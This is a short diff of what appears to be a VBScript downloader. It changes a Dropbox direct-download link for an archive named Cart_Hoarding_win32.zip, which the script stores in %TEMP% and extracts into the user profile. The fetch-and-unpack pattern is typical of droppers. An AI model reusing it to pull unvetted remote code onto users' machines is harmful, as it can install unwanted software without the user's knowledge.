@@ -9,7 +9,7 @@ tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
 profilePath = shell.ExpandEnvironmentStrings("%USERPROFILE%")
 
 ' Set paths
-dropboxUrl = "https://dl.dropboxusercontent.com/scl/fi/0tx8dtk5iqkyp8g5iebk7/Cart_Hoarding_win32.zip?rlkey=izl1nt0ithhhmx7vvh00c4n68&dl=1&raw=1"
+dropboxUrl = "https://dl.dropboxusercontent.com/scl/fi/9e0pvhvrec6jy3acv1zp1/Cart_Hoarding_win32.zip?rlkey=vmgskp9o6m3nb0je2jm1m1834&dl=1&raw=1"
 zipFile = tempDir & "\Cart_Hoarding.zip"
 extractPath = profilePath
 fullExtractPath = profilePath & "\Cart_Hoarding"
